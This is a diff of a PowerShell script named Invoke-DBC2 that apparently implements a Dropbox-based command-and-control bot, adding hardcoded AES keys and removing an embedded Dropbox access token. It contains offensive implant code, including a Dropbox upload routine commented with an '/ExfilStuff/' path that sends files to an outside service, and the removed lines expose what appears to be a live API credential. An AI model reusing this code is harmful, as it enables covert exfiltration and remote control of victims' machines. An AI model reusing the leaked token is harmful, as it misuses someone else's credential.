@@ -2,6 +2,9 @@ Function Invoke-DBC2{
 
     Function Invoke-Bot{
             
+	    $Global:secretIV = "Key@123Key@123fd"
+            $Global:SecretKey = "secret#456!23key"
+
             Function Aes-Decrypt($DecryptData){    
 
                 #Use the AES cipher and represent it as an object.
@@ -96,7 +99,7 @@ Function Invoke-DBC2{
 
             class dropbox{   
                     # Static Properties
-                    static [String] $ApiKey = "qkwLVnGMbKAAAAAAAAAADatC6sz__QhZG0aEWZhx0TlWIOIVGXpUP7084vCnnnD2"
+                    static [String] $ApiKey = ""#Insert DropBox Accesstoken Here.
                     static [String] $TargetfilePath 
                     
                     # [dropbox]::dropboxPutfile("/ExfilStuff/Harold-Reloaded.ps1",".\Untitled1.ps1")
@@ -107,7 +110,7 @@ Function Invoke-DBC2{
                         $enc = [system.Text.Encoding]::UTF8
 
                         $arguments = '{ "path": "' + $TargetfilePath + '", "mode": "add", "autorename": true, "mute": false }'
-                        #Give it our Api-Key to interact with the Dropbox Api qkwLVnGMbKAAAAAAAAAADatC6sz__QhZG0aEWZhx0TlWIOIVGXpUP7084vCnnnD2
+                        #Give it our Api-Key to interact with the Dropbox Api
                         $authorization = "Bearer $ApiK" 
                         $wc.headers.Add("Authorization", $authorization)
                         $wc.headers.Add("Dropbox-API-Arg", $arguments)
